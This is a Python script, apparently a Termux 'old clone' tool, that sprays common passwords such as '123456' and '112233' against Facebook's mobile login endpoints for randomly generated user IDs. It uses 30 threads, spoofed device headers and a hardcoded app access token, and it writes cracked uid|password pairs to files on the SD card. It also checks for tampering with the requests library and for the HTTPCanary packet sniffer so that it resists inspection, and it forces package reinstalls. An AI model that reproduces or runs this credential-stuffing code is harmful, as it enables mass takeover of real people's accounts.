import os
import random
import sys
import uuid
import time
import requests
from concurrent.futures import ThreadPoolExecutor as tred
import os, sys
channel_link = "https://whatsapp.com/channel/0029Vb6d5lB6hENw6TLYrO3h"


# Valid keys
approved_keys = ["KAMRUL-BOOS"]

def first_step():
    os.system("clear")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(" 🔒 Script Locked 🔒")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
    print("\033[1;32m JOIN OUR WHATSAPP CHANNEL ✅ \033[0m\n")
    print("\033[1;32m KEY APKO CHANEL SA MILY GI ✅ \033[0m\n")
    print("[!] Pehle WhatsApp Channel par join karo.")
    print(f"[+] Channel Link: https://whatsapp.com/channel/0029Vb6d5lB6hENw6TLYrO3h\n")
    os.system("xdg-open https://whatsapp.com/channel/0029Vb6d5lB6hENw6TLYrO3h")
    input("\n[↩] chanel par key hy follow de do or enter dabado...")

def check_key():
    user_key = input("\n[?] HELLO FRIEND✔️ PASTE YOUR KEY: ")
    if user_key in approved_keys:
        print("\n[✓] Key approved! Script is running...\n")
    else:
        print("\n[×] Invalid key! Dobara Channel par jao.")
        sys.exit()
# Pehle channel open hoga
first_step()

# Phir key check hoga
check_key()

# Tool ka main code yahan likho
print(">>> Tool Successfully Unlocked <<<")



# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()


# Initial setup and promotion
os.system('clear')
print(' \x1b[38;5;46mKAMRUL WORLD BEST SERVER LOADING....')


os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
print('loading Modules ...\n')
os.system('clear')
os.system('xdg-open https://chat.whatsapp.com/GHcW6KYs56c2aVQPsCvsD4?mode=ems_copy_t')
os.system('xdg-open https://www.facebook.com/kamrul.hasan.mahi.245994')
os.system('xdg-open https://www.youtube.com/@romantic-b7x')

# --- Anti-tampering and Security Checks ---
# The script checks if the source code of the 'requests' library has been modified
# or if packet sniffing tools are being used.
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
# Global Variables
oks = []
cps = []
loop = 0
user = []

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
W = '\x1b[1;37m'

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    return random.choice([A, B])

def ____banner____():
    os.system('clear')
    print("""\033[1;47m
██╗ ██╗ █████╗ ███╗ ███╗██████╗ ██╗ ██╗██╗
██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║ ██║██║
█████╔╝ ███████║██╔████╔██║██████╔╝██║ ██║██║ 🏁
██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██╗██║ ██║██║ ❤️
██║ ██╗██║ ██║██║ ╚═╝ ██║██║ ██║╚██████╔╝███████╗
╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═════╝ ╚══════╝
\033[0m""")

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('10005'):
            return '2020'
        elif uid.startswith('10006'):
            return '2021'
        elif uid.startswith(('10007', '10008')):
            return '2022'
        elif uid.startswith('1000000000'):
            return '2009'
        elif uid.startswith('100000000'):
            return '2009'
        elif uid.startswith('10000000'):
            return '2009'
        elif uid.startswith(('1000000','1000001','1000002','1000003','1000004','1000005')):
            return '2009'
        elif uid.startswith(('1000006','1000007','1000008','1000009')):
            return '2010'
        elif uid.startswith('100001'):
            return '2010'
        elif uid.startswith(('100002','100003')):
            return '2011'
        elif uid.startswith('100004'):
            return '2012'
        elif uid.startswith(('100005','100006')):
            return '2013'
        elif uid.startswith(('100007','100008')):
            return '2014'
        elif uid.startswith('100009'):
            return '2015'
        elif uid.startswith('10001'):
            return '2016'
        elif uid.startswith('10002'):
            return '2017'
        elif uid.startswith('10003'):
            return '2018'
        elif uid.startswith('10004'):
            return '2019'
        elif uid.startswith('10009'):
            return '2023'
        else:
            return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def BNG_71_():
    ____banner____()
    print(f' {G}(A){W} OLD CLONE')
    linex()
    __Jihad__ = input(f" CHOICE {W}: {Y}")
    if __Jihad__.lower() in ('a','01','1'):
        old_clone()
    else:
        print(f"\n{rad}Choose Valid Option...")
        time.sleep(2)
        BNG_71_()

def old_clone():
    ____banner____()
    print(f' (A) ALL SERIES')
    linex()
    print(f' (B) 100003/4 SERIES')
    linex()
    print(f' (C) 2020-2022 SERIES')
    linex()
    _input = input(f" CHOICE {W}: {Y}")
    choice = _input.lower()
    if choice in ('a','01','1'):
        old_One()
    elif choice in ('b','02','2'):
        old_Tow()
    elif choice in ('c','03','3'):
        old_C()
    else:
        print(f"\n{rad} Choose Value Option...")
        BNG_71_()

def old_One():
    user = []
    ____banner____()
    print(f" Old Code {Y}:{G} 2010-2014")
    ask = input(f" SELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f" EXAMPLE {Y}:{G} 20000 / 30000 / 60000 / 99999")
    limit = input(f" SELECT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print(' (A) METHOD 1')
    print(' (B) METHOD 2')
    linex()
    meth = input(f" CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f" TOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f" USE AIRPLANE MODE 1ST TIME FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f" {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tow():
    user = []
    ____banner____()
    print(f" OLD CODE {Y}:{G} 2010-2014")
    ask = input(f" SELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f" EXAMPLE {Y}:{G} 20000 / 30000 / 60000 / 99999")
    limit = input(f" SELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print(' (A) METHOD A')
    print(' (B) METHOD B')
    linex()
    meth = input(f" CHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f" TOTAL OLD ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f" USE AIRPLANE MODE 1ST TIME FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f" {rad}[!] INVALID METHOD SELECTED")
                break

def old_C():
    user = []
    ____banner____()
    print(f" OLD CODE {Y}:{G} 2020-2022 SERIES")
    limit = input(f" ENTER TOTAL IDS TO CLONE {Y}:{G} ")
    linex()
    prefixes = ['10005', '10006', '10007', '10008']  # 2020-2022 UID prefixes
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix_length = 15 - len(prefix)  # total UID length 15 assumed
        suffix = ''.join(random.choices('0123456789', k=suffix_length))
        uid = prefix + suffix
        user.append(uid)
    print(' (A) METHOD A')
    print(' (B) METHOD B')
    print(' (C) METHOD C')
    linex()
    meth = input(f" CHOOSE METHOD (A/B/C): ").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f" TOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f" USE AIRPLANE MODE FOR BEST RESULTS{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            elif meth == 'C':
                pool.submit(login_3, uid)
            else:
                print(f" {rad}[!] INVALID METHOD SELECTED")
                break

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r+(OK-M1)({loop})(OK)({len(oks)})")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '123123', '102030', '987654321', '1234567890', '100200', '12345678', '123456789', '112233'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r>(OK) {uid} = {pw} = {creationyear(uid)}")
                open('/sdcard/KAMRUL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r(OK) {uid} = {pw} = {creationyear(uid)}")
                open('/sdcard/KAMRUL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    global loop
    sys.stdout.write(f"\r+(OK-M2)({loop})(OK)({len(oks)})")
    sys.stdout.flush()
    for pw in ('123456', '1234567', '123123', '102030', '987654321', '1234567890', '100200', '12345678', '123456789', '112233'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(random.randint(20000000, 29999999)),
                    'x-fb-sim-hni': str(random.randint(20000, 40000)),
                    'x-fb-net-hni': str(random.randint(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r<(OK) {uid} = {pw} = {creationyear(uid)}")
                    open('/sdcard/KAMRUL-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'www.facebook.com' in str(po.get('error', '')):
                    print(f"\r(OK) {uid} = {pw} = {creationyear(uid)}")
                    open('/sdcard/KAMRUL-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception:
            pass
        loop += 1

def login_3(uid):
    global loop
    sys.stdout.write(f"\r+(OK-M3)({loop})(OK)({len(oks)})")
    sys.stdout.flush()
    for pw in ('123456','12345678', '123123', '121212', 'first123', '123456789', '1234567890', 'password1122' 'password123', 'password1'):
        try:
            with requests.Session() as session:
                headers = {
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                response = session.get(url, headers=headers).json()
                if 'session_key' in str(response):
                    print(f"\r<(OK) {uid} = {pw} = {creationyear(uid)}")
                    open('/sdcard/KAMRUL-OLD-M3-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception as e:
            print(f"Error in method C login: {e}")
        loop += 1

# Main program starts here
if __name__ == '__main__':
    first_step()
    check_key()
    print(">>> Tool Successfully Unlocked <<<")
    BNG_71_()
